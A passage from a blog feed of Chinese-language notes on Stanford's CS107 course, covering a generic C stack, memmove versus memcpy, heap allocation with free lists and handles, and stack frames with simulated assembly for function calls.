operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"stackc\"><a class=\"markdownIt-Anchor\" href=\"#stackc\">#</a> stack.c</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>freefn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>freefn <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">&lt;</span> loglength<span class=\"token punctuation\">,</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\ts<span class=\"token operator\">-></span><span class=\"token function\">freefn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">+</span> i<span class=\"token operator\">*</span>s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>s-&gt;freefn != NULL</code>  表示栈中有复杂的结构，如 char* 或者套用了另一个结构体之类的，因而需要我们调用自己的函数手动进行清楚空间。</p>\n<h3 id=\"main\"><a class=\"markdownIt-Anchor\" href=\"#main\">#</a> main</h3>\n<p>还是假设栈是字符串栈。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>stack stringStack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>stringStack<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>StringFree<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StringFree</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>elem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"rotate函数\"><a class=\"markdownIt-Anchor\" href=\"#rotate函数\">#</a> rotate 函数</h2>\n<p>实现一个 rotate 函数，将一个数组的前几项内容整体全部复制并挪到数组的尾部，其余部分往前移动。</p>\n<p>调用 memcpy 函数时，地址是不能重叠的。memmove 函数与 memcpy 类似，只不过效率更低，对重叠元素进行处理，并进行数组移动。尽可能多用 memcpy 少用 memmove</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>front<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>middle<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> frontSize <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>middle <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>front<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> backSize <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>end <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>middle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span>frontSize<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span>front<span class=\"token punctuation\">,</span>frontSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">memmove</span><span class=\"token punctuation\">(</span>front<span class=\"token punctuation\">,</span>middle<span class=\"token punctuation\">,</span>backSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 这里只能用 memmove 不能用 memcpy</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>end<span class=\"token operator\">-</span>frontSize<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>frontSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"c语言中通用的快速排序\"><a class=\"markdownIt-Anchor\" href=\"#c语言中通用的快速排序\">#</a> C 语言中通用的快速排序</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Qsort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>base<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> size<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>cmpfn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"c语言中的函数栈和堆栈\"><a class=\"markdownIt-Anchor\" href=\"#c语言中的函数栈和堆栈\">#</a> C 语言中的函数栈和堆栈</h2>\n<p>函数栈就不多说了，主函数高地址，每当调用新的函数时，就会入栈，从高地址到低地址，函数返回就会出栈。</p>\n<p>这里的堆栈指的不是一种优先队列数据结构，只是一块任意的字节。汇编代码一般都会在堆的低地址部分，由硬件进行管理；在汇编代码上方是由软件的堆内存管理器管理的，如 malloc、realloc、free 函数，是由软件管理的。</p>\n<p><img data-src=\"image-20231108204836201.png\" alt=\"image-20231108204836201\"></p>\n<p>堆内存是一个很大的线性的字节数组。当我们执行以下代码时：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>a <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>malloc 函数会从堆的开始地址开始查找，找到第一块适合请求大小的空闲内存，并将这块内存标记为已占用，并返回内存的开始地址。继续执行下面的代码：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>b <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>函数发现开始的一段内存块已经被占用了，它会快速的到达这块内存块的尾部，从空闲位置进行内存分配，和上一步的步骤类似。如果再执行以下代码：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>free 函数会抹掉这段内存的被占用状态，释放内存。再执行如下命令：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>函数会查看第一段内存块，发现这是一段 40 字节大小的空内存块，由于小于 44 字节，所以会直接跳到下一段空闲的足够大的内存块。之后执行如下代码：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>d <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这一次第一段的 40 字节内存块就足够大了，函数会将这块切下来并记录下是 20 字节大，然后再次返回这个指针。</p>\n<p>以上只是粗略的进行讲述堆栈的内存分配过程，实际上是有一个数据结构用来管理着整个堆栈，它使用了很多 void * 来进行内存管理，名字是空闲记录的链表，它始终记录着第一个空闲记录的地址，能够方便的找出哪一部分能够满足下一个 malloc 的需求</p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_8/",
            "url": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_8/",
            "title": "斯坦福编程范式CS107_8",
            "date_published": "2023-11-19T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_8\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_8\">#</a> 斯坦福编程范式 CS107_8</h1>\n<h2 id=\"关于内存\"><a class=\"markdownIt-Anchor\" href=\"#关于内存\">#</a> 关于内存</h2>\n<p>当我们执行下述命令时：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>arr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>我们都为以为返回的是 160 字节的内存，但实际上要比 160 多。在堆上，这段内存块开始的时候，会有一部分内存被用来记录这个内存块的大小。</p>\n<p><img data-src=\"image-20231113103637297.png\" alt=\"image-20231113103637297\"></p>\n<p>当我们执行如下命令时：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>arr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 当你觉得 100 个 int 类型的有点多，60 个就足够了，你尝试执行下面的代码</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>arr<span class=\"token operator\">+</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>以上是动态的申请空间。当执行 free 的时候，函数不会进行任何的完整性检查，malloc、free、reaclloc 都假设你是 C 或 C++ 语言编程高手。free 会机械的回退 4 或 8 字节，并将其中的内容理解为这一段要释放的内存的大小，并将这段长度的内存归还给堆。所以这样进行释放内存是不正确的。</p>\n<p>假设你以下述方式申请内存：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这是静态申请了数组空间，这种申请方式与堆内存无关，如果我们调用 free 函数，就会机械的向前回退 4 或 8 字节内存，并将其中的内容认为是要释放的内存的大小，并将这段长度的内存归还给堆。这样也不对，因为原先的内存不在堆中。</p>\n<h2 id=\"内存的分配\"><a class=\"markdownIt-Anchor\" href=\"#内存的分配\">#</a> 内存的分配</h2>\n<p>内存分配时有些实例会将堆进行分块，当一个内存申请小于 2 的 3 次方、5 次方、7 次方等，会被直接从堆的小、中、大块内存中进行分配，函数不会堆每次的内存分配精确的空间，而是通过规范大小的子内存段进行分配，这样可以更加快速的管理内存，并且内存段简洁且有组织。</p>\n<p><img data-src=\"image-20231113105637044.png\" alt=\"image-20231113105637044\"></p>\n<h2 id=\"堆中内存可用与不可用表示\"><a class=\"markdownIt-Anchor\" href=\"#堆中内存可用与不可用表示\">#</a> 堆中内存可用与不可用表示</h2>\n<p>当使用 malloc 或 realloc 时，函数希望能够快速的扫描堆中未使用的块。函数使用一个内存块的链表来记录可分配的区域，每次调用 malloc、realloc 内存管理器都会遍历这个链表，并找到某个足够大的内存块来满足请求。</p>\n<p><img data-src=\"image-20231113110446598.png\" alt=\"image-20231113110446598\"></p>\n<p>当使用 free 函数时，内存被释放并归还给堆时，这段内存块中的内容没有任何改变，没有清 0，只是其前四个字节指向下一段空闲内存开始地址，上一段空闲内存的指针指向这段内存的开始地址，现在系统认为这段内存就是空闲的。当然这样会导致内存中是分散的空闲内存，而没有整大段的空闲内存，有些实现会将空闲零碎的内存进行合并。</p>\n<p><img data-src=\"image-20231113111703122.png\" alt=\"image-20231113111703122\"></p>\n<p>假设一个堆有 200 字节，其中使用了 40 字节，还有 160 字节的空闲，但都是零碎的：</p>\n<p><img data-src=\"image-20231113112534202.png\" alt=\"image-20231113112534202\"></p>\n<p>如果用户动态申请 100 字节的空间，则无法提供，因为剩下的 160 字节内存都是零碎的。假如我们对堆内存进行整理，把已经占用的 40 字节都挪到一起，那么剩下的 160 字节就是一个整体了。但是这样做会出现一个问题：原先被占用的内存块的开始地址已经被分配给用户了，如果进行移动，则内存块的开始地址会变化，这和原先用户所获得的地址不一致。</p>\n<h2 id=\"堆内存的句柄管理\"><a class=\"markdownIt-Anchor\" href=\"#堆内存的句柄管理\">#</a> 堆内存的句柄管理</h2>\n<p>除去经典管理的部分，堆中的相当一部分的内存是通过句柄的方式进行管理的，其不再返回一个直接指向内存的地址，而是一个二级指针，即用户得到的是一个地址列表的某一个地址，地址列表中的地址指向句柄管理的内存。这个地址列表和堆内存都由管理器进行管理，这样在进行琐碎内存合并的时候，就可以进行重定向地址。当然这样也存在问题，在移动的内存的时候不可能对内存进行访问。</p>\n<p><img data-src=\"image-20231116151216582.png\" alt=\"image-20231116151216582\"></p>\n<p>所以在对某块内存进行使用时，就需要对系统发出 “不需要对这块内存进行压缩” 的命令，并在使用完这段内存的时候，再发出 “可以对这段内存进行压缩” 的命令。比较类似于并发。</p>\n<h2 id=\"栈段\"><a class=\"markdownIt-Anchor\" href=\"#栈段\">#</a> 栈段</h2>\n<p>栈的使用和函数的深度成比例。以下列函数为例</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">short</span> b<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">double</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">B</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">B</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">int</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>z<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">double</span> m<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述函数在被调用时都会对变量进行申请空间，A 申请的空间用六边形进行表示，B 申请的空间用三角形进行表示，C 申请的空间用圆进行表示。调用 A 的时候，栈会减去一个六边形空间用以存储 A 中的局部变量；随后 A 调用 B，栈会减去一个三角形空间大小用以存储 B 中的局部变量，B 只能访问这个三角形内存空间中的内容，而不知道它上方的内存都是些什么；随后 B 调用 C，因此栈会减去一个圆的空间大小以存储 C 中的局部变量。当 C 调用完毕后，栈指针会上升回到调用 C 之前的位置，C 内存空间的内容就是那个圆不会被清空，但是也已经无法被访问了；然后 B 调用完毕，指针回到 B 调用之前的位置。最后 A 调用 C，再指针向下移动一个圆的内存空间大小，覆盖了原先三角形的空间。</p>\n<p><img data-src=\"image-20231116154226894.png\" alt=\"image-20231116154226894\"></p>\n<h2 id=\"汇编代码和如何操作栈\"><a class=\"markdownIt-Anchor\" href=\"#汇编代码和如何操作栈\">#</a> 汇编代码和如何操作栈</h2>\n<p>使用 C 或者 C++ 模拟汇编语言的思路。</p>\n<p>在计算机中存在寄存器，寄存器和内存 RAM 相连，也和 ALU 逻辑运算器相连。寄存器通常是 4 字节大的，并且可以非常快速的进行访问。 <code>对任何变量进行加减乘除等运算时，都会将变量读取到寄存器中进行算数运算，不论变量是在栈中还是堆中，然后将结果写入其他寄存器中，然后将存储在寄存器中的内容写到属于它的内存中</code> 。</p>\n<p><img data-src=\"image-20231116161410592.png\" alt=\"image-20231116161410592\"></p>\n<p>如果将 ALU 直接和 RAM 进行相连，就会使时间大大增加。</p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_10/",
            "url": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_10/",
            "title": "斯坦福编程范式CS107_10",
            "date_published": "2023-11-19T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_10\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_10\">#</a> 斯坦福编程范式 CS107_10</h1>\n<h2 id=\"考虑完整的函数带有参数\"><a class=\"markdownIt-Anchor\" href=\"#考虑完整的函数带有参数\">#</a> 考虑完整的函数 (带有参数)</h2>\n<p>考虑申请一个如下的函数：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> bar<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>baz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">char</span> snink<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">short</span> <span class=\"token operator\">*</span>why<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>函数的传入变量和函数体内声明的局部变量在内存空间中是很近的。参数和局部变量的内存空间之间用了 4 字节进行分割，并且参数从右往左是从高地址到低地址的，所以 baz 的地址在 bar 之上。中间的四字节也十分重要，其中存储着调用函数的某些信息，它会告知我们是哪块代码调用了 <code>foo</code> 。</p>\n<p><img data-src=\"image-20231119164251173.png\" alt=\"image-20231119164251173\"></p>\n<p>考虑使用 main 函数进行案例：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当运行 main 函数时，我们将会演示整个内存空间是如何变化的。首先是 main 函数本身，具有两个参数 argc 和 argv，并且有一个 saved PC 的四字节空间</p>\n<p><img data-src=\"image-20231119165116530.png\" alt=\"image-20231119165116530\"></p>\n<p>接着对 i 进行初始化，并赋值为 4 。</p>\n<p>此时汇编代码如下所示，SP 是一个特殊的寄存器，为 stack pointer 它总是指向栈的最低地址。</p>\n<pre><code class=\"language-assembly\">SP = SP - 4;\nM[SP] = 4;\n</code></pre>\n<p>接着开始调用 foo 函数，下面的汇编代码将 i 以及 i 的地址 作为参数传入预留给 foo 函数的参数空间中，并将控制权移交给  <code>foo</code> 。CALL 类似于一个跳转命令，它会跳转到 foo 函数的汇编代码中，并在其执行结束后再跳转回 main 中。</p>\n<p>SP 最后会加 8，这部分内容 (SP = SP + 8) 也会被存储到 saved PC 中，这部分操作实际上是在执行 CALL 函数后自动进行的。当 foo 函数执行完毕后，它能根据记录的信息跳回到调用之前的地址。</p>\n<pre><code class=\"language-assembly\">SP = SP - 8;\nR1 = M[SP + 8];\nR2 = SP + 8;\nM[SP] = R1;\nM[SP + 4] = R2;\nCALL &lt;foo&gt;;\nSP = SP + 8;\n</code></pre>\n<p><img data-src=\"image-20231119173920404.png\" alt=\"image-20231119173920404\"></p>\n<p>随后我们开始执行 foo 函数中的代码。假设 foo 函数如下：</p>\n<p><code>&lt;foo&gt;:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> bar<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>baz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">char</span> snink<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">short</span> <span class=\"token operator\">*</span>why<span class=\"token punctuation\">;</span></pre></td></tr><tr><td 